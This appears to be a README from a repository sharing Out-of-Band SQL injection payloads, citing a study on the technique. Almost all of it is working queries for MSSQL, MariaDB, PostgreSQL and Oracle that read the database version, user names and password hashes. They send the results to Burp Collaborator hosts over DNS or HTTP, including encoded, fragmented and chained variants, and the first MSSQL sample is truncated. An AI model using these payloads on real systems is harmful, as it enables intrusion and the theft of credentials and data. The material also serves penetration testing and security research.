# OOB-SQLi

This part is for sharing sample queries for Out-of-Band (OOB) Structured Query Language (SQL) injection purpose. The detailed discussion may refer to the following links

https://zenodo.org/record/3556347#.XeDK1tURVPY
https://www.academia.edu/41117452/A_Study_of_Out-of-Band_Structured_Query_Language_Injection

# DNS Based Exfiltration

1. Microsoft SQL database

DECLARE @a varchar(1024); DECLARE @b varchar(1024); SELECT @a = (SELECT system_user);   SELECT @b = (SELECT DB_Name()); EXEC('master..xp_dirtree

2. MariaDB

select load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.',(SELECT+password),'.','n5tgzhrf768l71uaacqu0hqlocu2ir.burpcollaborator.net\\vfw')) 

3. PostgreSQL database

DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$ DECLARE exec_cmd TEXT; DECLARE query_result_version TEXT; DECLARE query_result_user TEXT; DECLARE query_result_password TEXT; BEGIN SELECT INTO query_result_version (SELECT current_setting('server_version')); SELECT INTO query_result_user (SELECT usename FROM pg_shadow); SELECT INTO query_result_password (SELECT passwd FROM pg_shadow); exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result_version||'.'||query_result_user||'.'||query_result_password||E'.n4sg4c5uh0t38fdncn1496qg47axym.burpcollaborator.net\\\\foobar.txt\''; EXECUTE exec_cmd; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT temp_function();

4. Oracle database

SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;

# HTTP Based Exfiltration

1. Oracle database

SELECT UTL_HTTP.request('http://fexvz59jd1088tjhf7y6z0onkeq4et.burpcollaborator.net/'||'?version='||(SELECT version FROM v$instance)||'&'||'user='||(SELECT user FROM dual)||'&'||'hashpass='||(SELECT spare4 FROM sys.user$ WHERE rownum=1)) FROM dual;

# Advanced OOB SQL Injection

1. Fragmentation + Encoding

DECLARE @d varchar(1024); DECLARE @T varchar(1024); SELECT @d = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as varbinary(max)), 1,LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2) FOR XML PATH(''), BINARY BASE64); SELECT @T = (SELECT REPLACE(@d, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.ophd0voy
beiseglonirht1morfx5lu.burpcollaborator.net\egg$"');                 

DECLARE @e varchar(1024); DECLARE @T varchar(1024); SELECT @e = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as varbinary(max)), LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2, LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))) FOR XML PATH(''), BINARY BASE64); SELECT @T = (SELECT REPLACE(@e, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.ophd0voy
beiseglonirht1morfx5lu.burpcollaborator.net\egg$"');                 

2. Chain of SQL Injection (Oracle DB + MariaDB)

SELECT UTL_HTTP.request('http://192.168.220.130/sqli.php?id=1%27%2b%28%28select%20load%5ffile%28CONCAT%28%27%5c%5c%5c%5c%27%2c%28SELECT%2buser%29%2c%27%2e%27%2c%28SELECT%2bpassword%29%2c%27%2e%27%2c%27jobuvs89ieon1z3f1qjkc0phk8qyen%2eburpcollaborator%2enet%5c%5cvfw%27%29%29%29%29%2b%27') FROM dual;                                                           
